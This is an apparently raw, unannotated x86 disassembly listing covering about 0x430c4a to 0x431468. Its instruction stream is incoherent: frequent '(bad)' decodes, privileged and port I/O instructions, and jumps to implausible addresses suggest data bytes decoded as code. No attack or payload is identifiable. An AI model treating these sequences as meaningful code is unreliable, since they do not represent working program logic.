  430c4a:	fadd   DWORD PTR [eax]
  430c4c:	mov    BYTE PTR [eax],0xd4
  430c4f:	push   0xffffffc3
  430c51:	push   edi
  430c52:	mov    edx,DWORD PTR [eax+0x51]
  430c55:	pop    edi
  430c56:	lea    ebx,[ebx-0x8]
  430c59:	ret    0x45
  430c5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c62:	xchg   eax,edi
  430c64:	mov    DWORD PTR [ebp-0x75],ecx
  430c67:	push   esi
  430c68:	clc    
  430c69:	jne    0x430c3b
  430c6b:	mov    ecx,0xf8450b0b
  430c70:	(bad)  
  430c71:	push   cs
  430c72:	or     BYTE PTR [ebp-0x3a],dh
  430c75:	cmp    eax,DWORD PTR [ecx]
  430c77:	pop    esi
  430c78:	(bad)  
  430c79:	or     al,0x5
  430c7b:	inc    eax
  430c7c:	leave  
  430c7d:	call   0x21994e86
  430c82:	iret   
  430c83:	inc    eax
  430c84:	leave  
  430c85:	jmp    0xd8ce4d89
  430c8a:	mov    eax,DWORD PTR [edx-0x3a]
  430c8d:	jl     0x430c83
  430c8f:	inc    eax
  430c90:	nop
  430c91:	loop   0x430c92
  430c93:	ret    
  430c94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c9a:	add    eax,0xff45e8f8
  430c9f:	push   esi
  430ca0:	push   DWORD PTR [ebp-0x39]
  430ca3:	mov    eax,0x7e9da46
  430ca8:	or     al,0x6
  430caa:	push   DWORD PTR [ebp-0x3a]
  430cad:	cmp    eax,DWORD PTR [edx]
  430caf:	pop    esi
  430cb0:	ret    
  430cb1:	or     al,0x56
  430cb3:	inc    ecx
  430cb4:	push   ebp
  430cb5:	jl     0x430ca3
  430cb7:	inc    edx
  430cb8:	inc    ebp
  430cb9:	leave  
  430cba:	add    DWORD PTR [ecx+0x28],eax
  430cbd:	and    esp,edi
  430cbf:	inc    ecx
  430cc0:	jne    0x430ca9
  430cc2:	add    DWORD PTR [edx+0x1c],eax
  430cc5:	enter  0xc38b,0x14
  430cc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430ccf:	clc    
  430cd0:	enter  0xd345,0x56
  430cd4:	div    DWORD PTR [ebp+0x50]
  430cd7:	mov    eax,0x7c80ece
  430cdc:	rol    DWORD PTR [esi],cl
  430cde:	div    DWORD PTR [ebp+0x50]
  430ce1:	cmp    ecx,edx
  430ce3:	pop    esi
  430ce4:	dec    BYTE PTR [edx]
  430ce6:	in     al,dx
  430ce7:	inc    edx
  430ce8:	sub    ebp,ebp
  430cea:	inc    eax
  430ceb:	(bad)  
  430cec:	push   eax
  430ced:	add    edx,DWORD PTR [eax-0x13]
  430cf0:	push   edi
  430cf1:	add    dh,dh
  430cf3:	leave  
  430cf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cf8:	add    BYTE PTR [ecx+0x0],dl
  430cfb:	inc    ebp
  430cfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430d02:	add    BYTE PTR [eax-0x7fbf448],bh
  430d08:	add    al,0x2
  430d0a:	jmp    0x57eb864
  430d0f:	jne    0x430cf9
  430d11:	mov    eax,DWORD PTR [edx]
  430d13:	or     BYTE PTR [eax],al
  430d15:	inc    ecx
  430d16:	stc    
  430d17:	jmp    0xe7824d52
  430d1c:	jge    0x430d5f
  430d1e:	mov    esi,ebp
  430d20:	lock ret 0x7d
  430d24:	and    ecx,DWORD PTR [ebx-0x171777]
  430d2a:	add    bh,bh
  430d2c:	aad    0xd7
  430d2e:	add    dh,cl
  430d30:	clts   
  430d32:	(bad)  
  430d33:	call   0xffce0c38
  430d38:	hlt    
  430d39:	iret   
  430d3a:	jge    0x430d12
  430d3c:	rol    DWORD PTR [esi-0x80],cl
  430d3f:	cmc    
  430d40:	or     BYTE PTR [edi-0x27],cl
  430d43:	(bad)  
  430d44:	out    dx,al
  430d45:	mov    eax,DWORD PTR [ebx]
  430d47:	(bad)  
  430d48:	pop    esi
  430d49:	push   es
  430d4a:	cmp    al,0xe8
  430d4c:	sar    edi,0x8
  430d4f:	inc    DWORD PTR [edi]
  430d51:	inc    esi
  430d52:	(bad)  
  430d53:	loop   0x430dd3
  430d55:	push   edi
  430d56:	push   cs
  430d57:	push   ebx
  430d58:	add    BYTE PTR [ebx+0x24008b56],cl
  430d5e:	add    BYTE PTR [ebp+0x50],al
  430d61:	push   eax
  430d62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d68:	sub    edx,DWORD PTR [esi-0x24]
  430d6b:	jne    0x430d23
  430d6d:	lods   eax,DWORD PTR ds:[esi]
  430d6e:	mov    edx,DWORD PTR [edx-0x34]
  430d71:	dec    esi
  430d72:	out    0x83,eax
  430d74:	into   
  430d75:	push   edi
  430d77:	loopne 0x430d47
  430d79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d84:	rol    DWORD PTR [edx],0x8
  430d87:	mov    esp,ecx
  430d89:	cmp    DWORD PTR [ebx],0xc
  430d8c:	mov    esi,0x5001c0
  430d91:	push   eax
  430d92:	push   cs
  430d93:	push   eax
  430d94:	(bad)  
  430d95:	sub    edx,edi
  430d97:	push   esi
  430d98:	adc    al,0xcb
  430d9a:	ins    DWORD PTR es:[edi],dx
  430d9b:	mov    eax,0x203e8
  430da0:	add    al,ah
  430da2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430da9:	add    dh,al
  430dab:	add    ah,ch
  430dad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430db3:	pop    ecx
  430db4:	or     eax,ebx
  430db6:	cli    
  430db7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430dbd:	lea    ebp,[ebx]
  430dbf:	mov    edx,DWORD PTR [edx-0x4]
  430dc2:	dec    ecx
  430dc3:	inc    ebp
  430dc4:	shr    BYTE PTR [ebx],0x4b
  430dc7:	and    al,0x0
  430dc9:	(bad)  
  430dca:	jne    0x430e11
  430dcc:	pop    eax
  430dcd:	mov    al,0x5a
  430dcf:	call   0x142102e
  430dd4:	and    al,0x85
  430dd6:	push   edx
  430dd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430ddb:	dec    ebp
  430ddc:	mov    cl,0x23
  430dde:	jmp    0x430dcc
  430de0:	mov    al,0xe7
  430de2:	call   0x13910d0
  430de7:	shr    DWORD PTR [eax+ebx*2],cl
  430dea:	lock (bad) 
  430dec:	adc    eax,0x757f008d
  430df1:	out    0x58,eax
  430df3:	cmp    al,0x7
  430df5:	pop    edx
  430df6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dfd:	push   ecx
  430dfe:	cld    
  430dff:	mov    esi,0x3b0175
  430e04:	and    al,0xb0
  430e06:	xor    BYTE PTR [edx+0x1],0x8b
  430e0a:	add    ah,bh
  430e0c:	mov    edi,DWORD PTR [ebp-0x4]
  430e0f:	psubsw mm7,QWORD PTR [edi]
  430e12:	add    DWORD PTR [ebp+0x0],ebp
  430e15:	rcr    eax,1
  430e17:	mov    edi,ecx
  430e19:	and    eax,DWORD PTR [eax]
  430e1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430e21:	call   0x130110a
  430e26:	add    al,cl
  430e28:	mov    ebp,esi
  430e2a:	aam    0x83
  430e2c:	or     DWORD PTR [ecx],eax
  430e2e:	jne    0x430e21
  430e30:	mov    eax,DWORD PTR [eax]
  430e32:	aam    0x0
  430e34:	dec    ebp
  430e35:	jne    0x430dc2
  430e37:	cmp    ebx,eax
  430e39:	jb     0x430e88
  430e3b:	jmp    0x430dc8
  430e3d:	mov    ebx,esp
  430e3f:	int3   
  430e40:	dec    ebp
  430e41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e48:	mov    edx,0x8b0a8b
  430e4d:	cmp    ecx,DWORD PTR [eax]
  430e4f:	jb     0x430e28
  430e51:	pop    edx
  430e52:	push   edi
  430e53:	cli    
  430e54:	pop    es
  430e55:	mov    eax,ecx
  430e57:	jb     0x430e5b
  430e59:	add    DWORD PTR [ebx],0xa
  430e5c:	mov    eax,DWORD PTR [ebx]
  430e5e:	int3   
  430e5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430e65:	jmp    0x430df2
  430e67:	mov    al,0xe8
  430e69:	call   0x10410eb
  430e6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430e71:	pop    edi
  430e72:	or     BYTE PTR [ecx-0x73],bl
  430e75:	pop    ecx
  430e76:	inc    edi
  430e77:	xor    al,0xeb
  430e79:	push   ecx
  430e7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e80:	call   0xb20f85
  430e85:	int3   
  430e86:	sbb    BYTE PTR [esi],ch
  430e88:	inc    ebp
  430e89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e8f:	call   0x9c10fe
  430e94:	or     BYTE PTR [ebx-0x73],dl
  430e97:	cmp    al,0x47
  430e99:	mov    al,0x1
  430e9b:	jb     0x430e9d
  430e9d:	mov    al,0x10
  430e9f:	push   eax
  430ea0:	add    al,0x75
  430ea2:	add    BYTE PTR [ebx],ch
  430ea4:	add    ebx,esp
  430ea6:	int3   
  430ea7:	jne    0x430eb9
  430ea9:	movsx  edx,cl
  430eac:	add    DWORD PTR [eax],eax
  430eae:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430eb5:	mov    gs,edi
  430eb7:	add    BYTE PTR [eax-0x50],ch
  430eba:	add    al,ch
  430ebc:	mov    eax,DWORD PTR [ecx]
  430ebe:	sub    eax,DWORD PTR [eax]
  430ec0:	jb     0x430f37
  430ec2:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430ec6:	jge    0x430eb0
  430ec8:	add    al,0x1
  430eca:	add    DWORD PTR [eax],0x0
  430ecd:	jne    0x430ecf
  430ecf:	je     0x430f16
  430ed1:	mov    eax,DWORD PTR [edi]
  430ed3:	ror    BYTE PTR [ebp+0x4d],1
  430ed6:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430edd:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ee3:	mov    DWORD PTR [ebx],ebp
  430ee5:	fadd   DWORD PTR [eax+0x75]
  430ee8:	inc    eax
  430ee9:	pop    eax
  430eea:	lea    ebx,[ecx+0x4f]
  430eed:	push   0xb1000003
  430ef2:	out    dx,eax
  430ef3:	add    ebp,DWORD PTR [edx+edx*2]
  430ef6:	add    BYTE PTR [ebx+ecx*4],bh
  430ef9:	mov    ch,BYTE PTR [ebx]
  430efb:	jb     0x430f6f
  430efd:	add    al,0x89
  430eff:	push   eax
  430f00:	call   0x842b5c72
  430f05:	add    DWORD PTR [eax+eax*1],eax
  430f08:	jae    0x430f1e
  430f0a:	icebp  
  430f0b:	inc    ebp
  430f0c:	mov    eax,DWORD PTR gs:[ecx]
  430f0f:	int3   
  430f10:	out    dx,al
  430f11:	loopne 0x430f60
  430f13:	sub    eax,DWORD PTR [edx]
  430f15:	push   0xffffff83
  430f17:	pop    esi
  430f18:	push   cs
  430f19:	jl     0x430f34
  430f1b:	add    al,0xaf
  430f1d:	xor    eax,0x832b6d00
  430f22:	mov    eax,DWORD PTR [edx]
  430f24:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430f2a:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430f30:	inc    ebp
  430f31:	shr    ebx,0x3
  430f34:	or     DWORD PTR [eax],0x4
  430f37:	push   0xffffffa5
  430f39:	pop    esi
  430f3a:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f41:	jmp    0x430fa0
  430f43:	mov    edi,0xff0272
  430f48:	fdivr  QWORD PTR [ebp+0x5d]
  430f4b:	push   0x4e
  430f4d:	pop    ecx
  430f4e:	call   0x435353
  430f53:	mov    DWORD PTR [ebx],eax
  430f55:	in     al,0xc8
  430f57:	rol    BYTE PTR [ebp-0x75],0xc1
  430f5b:	call   0xad113c
  430f60:	pop    esi
  430f61:	enter  0xceff,0x8b
  430f65:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f69:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f70:	je     0x430f72
  430f72:	or     DWORD PTR [ebx-0x74183b24],eax
  430f78:	jne    0x430f5e
  430f7a:	jmp    0x430f75
  430f7c:	push   DWORD PTR [edx-0x24]
  430f7f:	push   0x4d
  430f81:	pop    ecx
  430f82:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f86:	jge    0x430f8e
  430f88:	mov    eax,eax
  430f8a:	sub    ebp,DWORD PTR [edx+0x24]
  430f8d:	pop    esi
  430f8e:	inc    ebp
  430f8f:	mov    esp,0x8b6077
  430f94:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f9a:	lods   al,BYTE PTR ds:[esi]
  430f9b:	add    BYTE PTR [ebx],bh
  430f9d:	enter  0xce73,0x49
  430fa1:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430fa9:	stc    
  430faa:	jge    0x43101e
  430fac:	jnp    0xdd42931b
  430fb2:	call   0xc61088
  430fb7:	fadd   st(0),st
  430fb9:	dec    esi
  430fba:	ins    BYTE PTR es:[edi],dx
  430fbb:	stc    
  430fbc:	cmp    al,0x73
  430fbe:	push   ebp
  430fbf:	mov    eax,0xf8028b
  430fc4:	jne    0x430f87
  430fc6:	mov    esi,ecx
  430fc8:	mov    esp,DWORD PTR [ebp+0x2c]
  430fcb:	add    edi,DWORD PTR [ebp-0x24]
  430fce:	sub    esp,eax
  430fd0:	and    al,0x45
  430fd2:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430fd8:	sbb    al,0xee
  430fda:	pop    esi
  430fdb:	call   0x83100b
  430fe0:	fsubr  st,st(3)
  430fe2:	sti    
  430fe3:	add    BYTE PTR gs:[ecx],bh
  430fe6:	add    eax,esp
  430fe8:	add    DWORD PTR [esi],eax
  430fea:	rol    DWORD PTR [ebp+0x8],0x29
  430fee:	mov    esp,eax
  430ff0:	clc    
  430ff1:	jne    0x431068
  430ff3:	mov    eax,0x8b0673
  430ff8:	loopne 0x43103f
  430ffa:	loopne 0x430f85
  430ffc:	lods   al,BYTE PTR ds:[esi]
  430ffd:	int3   
  430ffe:	inc    ebp
  430fff:	mov    DWORD PTR gs:[eax+edi*8],eax
  431003:	add    al,0xc3
  431005:	sub    ecx,DWORD PTR [ebp+0x47]
  431008:	(bad)  
  43100a:	shr    BYTE PTR [ebp-0x1f],0xe8
  43100e:	add    eax,DWORD PTR [eax]
  431010:	call   0x644d115
  431015:	add    esi,DWORD PTR [esi-0x3b2efc83]
  43101b:	dec    esi
  43101c:	ins    DWORD PTR es:[edi],dx
  43101d:	in     al,dx
  43101e:	lea    eax,[eax]
  431020:	inc    ebp
  431021:	inc    ebp
  431022:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  431028:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  431032:	and    al,0xdc
  431034:	ror    DWORD PTR [edx+0x24],0xf7
  431038:	or     BYTE PTR [ebp+0x4c],dh
  43103b:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  43103f:	stos   BYTE PTR es:[edi],al
  431040:	adc    edx,edi
  431042:	inc    esp
  431043:	add    edi,DWORD PTR [eax]
  431045:	jne    0x43102a
  431047:	mov    DWORD PTR [eax-0x7449db04],ecx
  43104d:	cmp    ecx,DWORD PTR [edi]
  43104f:	sub    BYTE PTR [ebp-0x7e],dl
  431052:	sar    ebp,0xb
  431055:	jmp    FWORD PTR [edi+0x2400392a]
  43105b:	sub    esi,DWORD PTR [ebx-0x73]
  43105e:	mov    esp,DWORD PTR [ecx+edi*4]
  431061:	mov    ecx,DWORD PTR [eax]
  431063:	and    BYTE PTR [eax],al
  431065:	jne    0x431031
  431067:	sub    ebp,ecx
  431069:	sbb    BYTE PTR [esi+0x32],ah
  43106c:	dec    ebp
  43106d:	push   ebp
  43106e:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431074:	ret    
  431075:	mov    edx,ebp
  431077:	leave  
  431078:	sub    DWORD PTR [esi+0x24],ebx
  43107b:	ret    0x2b
  43107e:	pop    ax
  431080:	push   ebp
  431081:	rol    BYTE PTR [ebx],0xeb
  431084:	add    DWORD PTR [ecx+0x6c0001],0x40
  43108b:	jb     0x4310e2
  43108d:	ret    
  43108e:	in     al,dx
  43108f:	jecxz  0x43101c
  431091:	push   esi
  431092:	xchg   esp,eax
  431093:	jne    0x431095
  431095:	cmp    edx,DWORD PTR [esi+0x1c]
  431098:	jne    0x43107e
  43109a:	mov    eax,DWORD PTR [ebp-0x77]
  43109d:	ror    DWORD PTR [ebx+0x899408],0xe0
  4310a4:	mov    esi,DWORD PTR [ebp-0x75]
  4310a7:	pop    esi
  4310a8:	nop
  4310a9:	mov    eax,DWORD PTR [eax]
  4310ab:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  4310b1:	add    al,0x0
  4310b3:	inc    ebp
  4310b4:	mov    eax,DWORD PTR [ebx]
  4310b6:	mov    ebp,ebx
  4310b8:	cmp    al,0xf
  4310ba:	or     al,al
  4310bc:	inc    ebp
  4310bd:	inc    ebp
  4310be:	xor    eax,0x8bc89c8b
  4310c3:	ins    BYTE PTR es:[edi],dx
  4310c4:	cld    
  4310c5:	add    BYTE PTR [edi+0x536c16c0],dh
  4310cb:	add    BYTE PTR [ecx-0x5],dl
  4310ce:	add    eax,0x17200
  4310d3:	sbb    al,0x85
  4310d5:	dec    esp
  4310d6:	je     0x431110
  4310d8:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310dc:	add    BYTE PTR [ebx],bh
  4310de:	(bad)  
  4310df:	and    al,0x34
  4310e1:	jae    0x43107f
  4310e3:	mov    cl,cl
  4310e5:	inc    DWORD PTR [esp]
  4310e8:	push   ebp
  4310e9:	shr    esp,0x8
  4310ec:	in     al,dx
  4310ed:	push   esp
  4310ee:	add    DWORD PTR [eax],esp
  4310f0:	add    bl,cl
  4310f2:	inc    ebp
  4310f3:	mov    bh,0x89
  4310f5:	add    ah,bh
  4310f7:	jmp    0xca772041
  4310fc:	pushf  
  4310fd:	dec    esp
  4310fe:	push   ebx
  4310ff:	and    BYTE PTR [ebp+0x17],al
  431102:	xor    eax,0x56009cd9
  431107:	add    BYTE PTR [ebp+0x2b],al
  43110a:	in     eax,0xc1
  43110c:	inc    ebp
  43110d:	add    eax,0xc601d8
  431112:	mov    al,0xc6
  431115:	ins    BYTE PTR es:[edi],dx
  431116:	mov    DWORD PTR [eax+0x6a],0xc805c6c1
  43111d:	dec    esp
  43111e:	xor    esp,DWORD PTR [eax]
  431120:	(bad)  
  431121:	fxch   st(1)
  431123:	sub    DWORD PTR [ebx],esi
  431125:	add    BYTE PTR [edx-0x40],bl
  431128:	mov    eax,0x248d8d00
  43112e:	xor    eax,0x188b0fc3
  431133:	push   ecx
  431134:	fimul  DWORD PTR [edx+0x8801d9]
  43113a:	or     DWORD PTR [ebx+0x36ed0806],0x45
  431141:	xor    ebx,ebp
  431143:	mov    al,BYTE PTR [ebp+0x1]
  431146:	jmp    0xdb4c564b
  43114b:	mov    dl,0x45
  43114d:	add    esi,ebp
  43114f:	add    BYTE PTR [ebp+0xe],al
  431152:	sub    DWORD PTR [edx+0x2e0145],eax
  431158:	inc    ebp
  431159:	or     BYTE PTR [ecx+ecx*2-0xa],bh
  43115d:	add    eax,DWORD PTR [edi+eax*8-0x24]
  431161:	cld    
  431162:	mov    dh,0xa5
  431164:	xor    edi,eax
  431166:	add    eax,DWORD PTR [ebp+0x46]
  431169:	prefetcht0 BYTE PTR [ecx-0x2]
  43116d:	xor    eax,0x7c60872
  431172:	mov    esp,0xbd32c69a
  431177:	pop    esi
  431178:	mov    cl,0xbe
  43117b:	or     al,0xc6
  43117d:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431184:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43118b:	add    dh,al
  43118d:	mov    eax,ebx
  43118f:	xor    DWORD PTR [ebx],0x35008dbc
  431195:	mov    ecx,DWORD PTR [edi]
  431197:	sbb    al,0x18
  431199:	inc    ebp
  43119a:	fcmovb st,st(7)
  43119c:	fxtract 
  43119e:	mov    BYTE PTR [ebp-0x38f7077d],al
  4311a4:	in     eax,dx
  4311a5:	call   0xf942972f
  4311aa:	inc    esi
  4311ac:	inc    ebp
  4311ad:	les    ecx,FWORD PTR [ebx-0x103a273a]
  4311b3:	push   edi
  4311b4:	adc    eax,DWORD PTR [ebp-0x77]
  4311b7:	out    0x8b,eax
  4311b9:	inc    ebp
  4311ba:	cmp    BYTE PTR [ecx],ch
  4311bc:	inc    DWORD PTR [ebp+0x3b]
  4311bf:	inc    ebp
  4311c0:	jne    0x4311f0
  4311c2:	(bad)  
  4311c3:	(bad)  
  4311c4:	mov    eax,0xf87c8545
  4311c9:	test   BYTE PTR [ebp-0x47],0xea
  4311cd:	add    BYTE PTR [eax+eax*1-0x3b03bb75],bl
  4311d4:	xor    BYTE PTR [esi+0x3003301],0x38
  4311db:	inc    esi
  4311dc:	test   DWORD PTR [eax],ebx
  4311de:	add    bh,dh
  4311e0:	add    BYTE PTR [edx+0x45],dh
  4311e3:	(bad)  
  4311e4:	mov    ebx,esp
  4311e6:	jl     0x4311ae
  4311e8:	add    ch,bl
  4311ea:	mov    esi,eax
  4311ec:	mov    ebx,esi
  4311ee:	cld    
  4311ef:	mov    BYTE PTR [eax+0xc601df],0xe0
  4311f6:	cmp    dh,al
  4311f8:	imul   esp,ecx,0xe28dc600
  4311fe:	shl    DWORD PTR [ebx],1
  431200:	mov    DWORD PTR [ebp+0xfff3564],ecx
  431206:	mov    ebx,DWORD PTR [eax]
  431208:	data16 fiadd DWORD PTR [ebp-0x770027]
  43120f:	add    eax,0x7
  431212:	in     ax,dx
  431214:	test   DWORD PTR [ebp-0x1],eax
  431217:	jmp    0xe48a581b
  43121c:	inc    bp
  43121e:	test   eax,esp
  431220:	inc    DWORD PTR [ebp-0x1]
  431223:	cmc    
  431224:	rol    BYTE PTR [ebp+0x66],0xdf
  431228:	test   DWORD PTR [ebp-0x1],eax
  43122b:	in     al,dx
  43122c:	inc    DWORD PTR [ebp+0x47]
  43122f:	out    0x66,eax
  431231:	inc    ebp
  431232:	test   DWORD PTR [edi+edi*8-0xa],edi
  431236:	inc    DWORD PTR [eax+eax*8-0x44]
  43123a:	data16 mov dh,0x85
  43123d:	xor    edi,edi
  43123f:	add    edi,edi
  431241:	inc    esi
  431242:	inc    edi
  431243:	sbb    BYTE PTR [esi-0x2],ah
  431246:	test   DWORD PTR [edx-0x1],esi
  431249:	(bad)  
  43124a:	(bad)  
  43124b:	cmp    bh,al
  43124d:	dec    DWORD PTR [ecx-0x278b77]
  431253:	dec    ebp
  431254:	cmp    DWORD PTR [eax+0x7189fc03],0x76
  43125b:	add    edi,edi
  43125d:	lea    edi,[eax+0xff99ff]
  431263:	enter  0xe89,0x78
  431267:	inc    ebp
  431268:	push   DWORD PTR ds:0xc7829cb8
  43126e:	add    BYTE PTR [eax-0x7857a77],bh
  431274:	inc    DWORD PTR [ebp-0x48]
  431277:	mov    edx,edi
  431279:	mov    WORD PTR [eax],es
  43127b:	add    BYTE PTR [ecx-0xf083c7],cl
  431281:	pop    edi
  431282:	add    DWORD PTR [eax],0xffffffe4
  431285:	mov    ecx,DWORD PTR [ecx-0x7f8104]
  43128b:	add    DWORD PTR [eax+0x382700],edi
  431291:	inc    ebp
  431292:	mov    DWORD PTR [ebx+0x4c8080],ecx
  431298:	add    BYTE PTR [ecx+0x4f45b866],cl
  43129e:	lea    eax,[eax]
  4312a0:	add    eax,0x89660878
  4312a5:	test   DWORD PTR [edi+edi*8-0x381600bb],eax
  4312ac:	loopne 0x431237
  4312ae:	(bad)  
  4312af:	data16 aam 0xff
  4312b2:	in     al,dx
  4312b3:	cmp    DWORD PTR [edi+edi*1+0x45],0xffffff89
  4312b8:	pop    ecx
  4312b9:	push   0x8ddaff18
  4312be:	jmp    0x4312bf
  4312c0:	mov    BYTE PTR [ecx-0x8a95c0],cl
  4312c6:	lea    eax,[ebx-0x767aee30]
  4312cc:	(bad)  
  4312cd:	ins    BYTE PTR es:[edi],dx
  4312ce:	(bad)  
  4312cf:	inc    DWORD PTR [ebp-0xfb0173]
  4312d5:	mov    DWORD PTR [ebx+0x53fff46e],ecx
  4312db:	adc    DWORD PTR [ecx+0x3d],0x33
  4312df:	mov    DWORD PTR [ebx+0xff7270],edi
  4312e5:	(bad)  
  4312e6:	ret    
  4312e7:	add    cl,BYTE PTR [ebx-0x3f8d0377]
  4312ed:	call   DWORD PTR [eax-0x75]
  4312f0:	inc    ebp
  4312f1:	mov    ax,WORD PTR [ebp-0xff0068]
  4312f8:	mov    eax,0x85ff66b0
  4312fe:	add    edi,edi
  431300:	add    bh,bh
  431302:	(bad)  
  431303:	stc    
  431304:	inc    DWORD PTR [eax]
  431306:	or     BYTE PTR [esi+0x45],ah
  431309:	test   DWORD PTR [ebp-0x7e008a01],eax
  43130f:	outs   dx,BYTE PTR ds:[esi]
  431310:	pop    DWORD PTR [eax]
  431312:	adc    ah,BYTE PTR [esi-0x78]
  431315:	test   DWORD PTR [eax-0x1],esi
  431318:	mov    ecx,0x6b4fff
  43131d:	add    cl,al
  43131f:	mov    WORD PTR [ebp-0x3f0078],ax
  431326:	mov    eax,eax
  431328:	data16 push bp
  43132b:	test   DWORD PTR [ebp-0x76000201],ecx
  431331:	dec    esp
  431332:	mov    WORD PTR [eax],es
  431334:	ret    0x6666
  431337:	inc    ebp
  431338:	push   ebp
  431339:	mov    eax,0xf3478d
  43133e:	mov    DWORD PTR [ecx+0x47c28290],ecx
  431344:	pushw  0x55
  431347:	lea    ax,[ebp-0x1f]
  43134b:	(bad)  
  43134c:	mov    eax,edx
  43134e:	xchg   esp,eax
  43134f:	in     al,0x89
  431351:	cmc    
  431352:	xchg   esi,eax
  431353:	inc    ebp
  431354:	iret   
  431355:	fisttp WORD PTR [ecx+0x4a8d98e7]
  43135b:	ror    BYTE PTR [ebx+0x5532668a],1
  431361:	or     BYTE PTR [ebx+0x55186639],0x49
  431368:	(bad)  
  431369:	repz cmp eax,0xa0898945
  43136f:	mov    ah,0x89
  431371:	jmp    DWORD PTR [edx+0x66b0418d]
  431377:	inc    DWORD PTR [ebp+0x50]
  43137a:	add    DWORD PTR [ebp-0xd],0xffffffbe
  43137e:	mov    DWORD PTR [eax],ecx
  431380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431381:	pop    es
  431382:	inc    ecx
  431383:	(bad)  
  431384:	call   0x366:0x3245
  43138a:	dec    ebp
  43138b:	push   eax
  43138c:	inc    bp
  43138e:	jge    0x431313
  431390:	mov    esp,DWORD PTR [esi-0x18]
  431393:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  431399:	add    DWORD PTR [ebx],esi
  43139b:	add    BYTE PTR [ebx],al
  43139d:	test   DWORD PTR [ebx],esi
  43139f:	(bad)  
  4313a0:	inc    WORD PTR [ebp+0x0]
  4313a4:	mov    eax,DWORD PTR [eax]
  4313a6:	call   0x8898cadb
  4313ab:	mov    esi,eax
  4313ad:	clc    
  4313ae:	ret    
  4313af:	rol    cl,0xa
  4313b2:	mov    DWORD PTR ds:0x7c0ec88,esi
  4313b8:	mov    edx,edi
  4313ba:	pushf  
  4313bb:	pop    es
  4313bc:	jmp    DWORD PTR [edx+0x66]
  4313bf:	add    BYTE PTR [ebp-0x990175],al
  4313c5:	inc    ebp
  4313c6:	test   DWORD PTR [ebx-0x2f00ea02],eax
  4313cc:	push   ebp
  4313cd:	mov    edi,eax
  4313cf:	mov    dh,BYTE PTR [eax+0x266ff51]
  4313d5:	push   ebp
  4313d6:	add    BYTE PTR [ebx-0x764b0777],al
  4313dc:	dec    DWORD PTR [esi+0x661851e8]
  4313e2:	add    BYTE PTR [ebp-0x7b],dl
  4313e5:	cmp    esi,0xfffffff3
  4313e8:	dec    DWORD PTR [ecx+0x51fe9285]
  4313ee:	jmp    DWORD PTR [esi-0x75]
  4313f1:	push   ebp
  4313f2:	hlt    
  4313f3:	data16 (bad) 
  4313f5:	dec    ebp
  4313f6:	ret    
  4313f7:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  4313fd:	lea    edx,[eax-0x1]
  431400:	jne    0x4313d3
  431402:	dec    DWORD PTR [ecx-0x2f7a63f8]
  431408:	dec    BYTE PTR [ecx+0x51559eff]
  43140e:	mov    DWORD PTR [esi-0x4c],esp
  431411:	push   ebp
  431412:	jmp    DWORD PTR [esi-0x18]
  431415:	inc    ebp
  431416:	sbb    BYTE PTR [ebp-0x767acd00],cl
  43141c:	(bad)  
  43141d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43141e:	inc    eax
  431420:	test   DWORD PTR [esi-0x2],esp
  431423:	inc    ebp
  431424:	dec    DWORD PTR [ebp-0x760bde75]
  43142a:	(bad)  
  43142b:	test   al,0xc3
  43142d:	mov    DWORD PTR [ebp-0x769b56],ecx
  431433:	lods   al,BYTE PTR ds:[esi]
  431434:	push   eax
  431435:	inc    ebp
  431436:	jne    0x431447
  431438:	dec    DWORD PTR [ebp+0x8]
  43143b:	mov    eax,DWORD PTR [ebx]
  43143d:	sbb    al,0x0
  43143f:	(bad)  
  431440:	mov    eax,0xc14fc3
  431445:	mov    DWORD PTR [eax-0x64],edi
  431448:	inc    bp
  43144a:	test   DWORD PTR [edi],ecx
  43144c:	dec    DWORD PTR [ebp-0x1]
  43144f:	xor    eax,edi
  431451:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  431457:	inc    ebp
  431458:	xor    DWORD PTR [ebx],0x3f
  43145b:	mov    WORD PTR [ebp-0x1bc],ax
  431462:	lea    ecx,[ecx-0x767702]
  431468:	inc    esi
